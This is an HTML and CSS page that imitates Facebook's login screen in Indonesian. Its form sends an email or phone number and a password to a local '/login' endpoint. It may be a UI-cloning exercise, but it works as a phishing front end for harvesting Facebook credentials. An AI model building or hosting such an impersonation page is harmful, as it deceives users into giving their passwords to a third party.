<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Login ke Facebook</title>
    <style>
        body { margin: 0; padding: 0; font-family: Arial, Helvetica, sans-serif; }
        section {
            position: relative;
            justify-content: center;
            align-items: center;
            width: 100%;
            display: flex;
            min-height: 100vh;
            background-color: #f0f2f5;
        }
        section .main .facebook {
            margin: -40px 0 -2px 0;
            width: 240px;
        }
        section .main {
            width: 500px;
            align-items: center;
            justify-content: center;
            display: flex;
            flex-direction: column;
            margin-bottom: 40px;
        }
        section .main .box {
            position: relative;
            border: 1px solid #dddfe2;
            box-shadow: 4px 8px 16px rgb(0, 0, 0, 0.1), 4px 8px 16px rgb(0, 0, 0, 0.1);
            border-radius: 8px;
            padding: 0 0 14px 0;
            justify-content: center;
            align-items: center;
            width: 396px;
            text-align: center;
            background-color: #fff;
        }
        section .main .box .login-text {
            padding: 20px;
            font-size: 18px;
            padding-top: 24px;
            padding-bottom: 16px;
        }
        section .main .box input {
            width: 330px;
            height: 22px;
            padding: 14px 16px;
            margin: 0 15px 15px 15px;
            border-radius: 6px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            background-color: #FFFFFF;
            outline: none;
        }
        section .main .box .login {
            width: 364px;
            height: 48px;
            padding: 0 16px;
            margin: 0 15px 15px 15px;
            border: none;
            border-radius: 6px;
            background-color: #1877f2;
            font-size: 20px;
            font-weight: bold;
            color: #fff;
            cursor: pointer;
        }
        section .main .box div a {
            font-size: 14px;
            text-decoration: none;
            color: #1877f2;
            font-weight: 500;
        }
        section .main .box .or {
            font-size: 12px;
            margin: 12px;
            color: #96999e;
        }
        section .main .box .newAcc {
            width: 195px;
            line-height: 48px;
            padding: 0 16px;
            font-size: 17px;
            font-weight: bold;
            border-radius: 6px;
            border: none;
            background-color: #42b72a;
            color: #fff;
            margin: 0 15px 12px 15px;
            cursor: pointer;
        }
        ::placeholder { color: #929395; }
        section .main .box .login:hover { background-color: #106fea; }
        section .main .box .newAcc:hover { background-color: #30ad17; }
        section .main .box div a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <section>
        <div class="main">
            <img src="https://github.com/Supriyo2810/Facebook-Login/blob/main/facebook.png?raw=true" alt="Facebook" class="facebook" />
            <div class="box">
                <div class="login-text">Log in to Facebook</div>
                <form method="POST" action="/login">
                    <input type="text" name="email" placeholder="Email atau Nomor Telepon" required />
                    <input type="password" name="password" placeholder="Kata Sandi" required />
                    <button type="submit" class="login">Login</button>
                </form>
                <div><a href="#">Lupa Akun?</a></div>
                <div class="or">atau</div>
                <form method="GET" action="/register">
                    <button class="newAcc">Buat Akun Baru</button>
                </form>
            </div>
        </div>
    </section>
</body>
</html>
